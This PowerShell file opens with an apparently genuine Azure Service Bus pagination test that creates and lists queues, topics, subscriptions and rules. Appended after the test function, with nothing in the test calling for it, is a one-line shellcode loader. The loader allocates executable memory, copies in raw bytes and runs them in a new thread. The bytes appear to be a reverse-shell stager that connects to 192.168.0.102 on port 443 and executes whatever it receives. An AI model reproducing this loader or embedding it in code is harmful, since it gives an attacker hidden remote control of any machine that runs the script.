














function ServiceBusPaginationTests {
    
    $location = Get-Location
    $resourceGroupName = getAssetName "RGName-"
    $namespaceName = getAssetName "Namespace1-"
    $nameQueue = getAssetName "Queue-"
    $nameTopic = getAssetName "Topic-"
    $subName = getAssetName "Subscription-"
    $ruleName = getAssetName "Rule-"
    $ruleName1 = getAssetName "Rule-"
    $count = 0
	 
    Write-Debug "Create resource group"
    Write-Debug "ResourceGroup name : $resourceGroupName"
    New-AzResourceGroup -Name $resourceGroupName -Location $location -Force
        
    Write-Debug " Create new Topic namespace"
    Write-Debug "NamespaceName : $namespaceName" 
    $result = New-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Location $location -Name $namespaceName
    
    Try {
        Write-Debug "Get the created namespace within the resource group"
        $createdNamespace = Get-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName

        Assert-AreEqual $createdNamespace.Name $namespaceName

        Assert-AreEqual $createdNamespace.Name $namespaceName "Namespace created earlier is not found."

        
        while ($count -lt 50) {
            $queueNameNew = $nameQueue + "_" + $count
            New-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $queueNameNew
            $count = $count + 1
        }
	
        $get30Queue = Get-AzServiceBusQueue -ResourceGroupName $resourceGroupName -Namespace $namespaceName -MaxCount 30
        Assert-AreEqual 30 $get30Queue.Count "Get Queue with MaxCount 30 not returned total 30"

        
        $count = 0
        $topicNameNew = $nameTopic + "_" + $count
        while ($count -lt 50) {
            $topicNameNew = $nameTopic + "_" + $count
            New-AzServiceBusTopic -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Name $topicNameNew -EnablePartitioning $TRUE
            $count = $count + 1
        }
	
        $get30Topic = Get-AzServiceBusTopic -ResourceGroupName $resourceGroupName -Namespace $namespaceName -MaxCount 30	
        Assert-AreEqual 30 $get30Topic.Count "Get Topic with MaxCount 30 not returned total 30"

        
        $count = 0
        $subscriptionNameNew = $subName + "_" + $count
        while ($count -lt 50) {
            $subscriptionNameNew = $subName + "_" + $count
            New-AzServiceBusSubscription -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Topic $topicNameNew -Name $subscriptionNameNew
            $count = $count + 1
        }
	
        $get30Sub = Get-AzServiceBusSubscription -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Topic $topicNameNew -MaxCount 30	
        Assert-AreEqual 30 $get30Sub.Count "Get Subscription with MaxCount 30 not returned total 30"	

        
        $count = 0
        $ruleNameNew = $ruleName + "_" + $count
        while ($count -lt 50) {
            $ruleNameNew = $ruleName + "_" + $count
            New-AzServiceBusRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Topic $topicNameNew -Subscription $subscriptionNameNew -Name $ruleNameNew -SqlExpression "myproperty='test'"
            $count = $count + 1
        }
	
        $get30Rule = Get-AzServiceBusRule -ResourceGroupName $resourceGroupName -Namespace $namespaceName -Topic $topicNameNew -Subscription $subscriptionNameNew -MaxCount 25	
        Assert-AreEqual 25 $get30Rule.Count "Get Rules with MaxCount 30 not returned total 30"
    }
    Finally {
        
        

        Write-Debug "Delete NameSpace"
        Remove-AzServiceBusNamespace -ResourceGroupName $resourceGroupName -Name $namespaceName

        Write-Debug " Delete resourcegroup"
        Remove-AzResourceGroup -Name $resourceGroupName -Force
    }

	
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x66,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

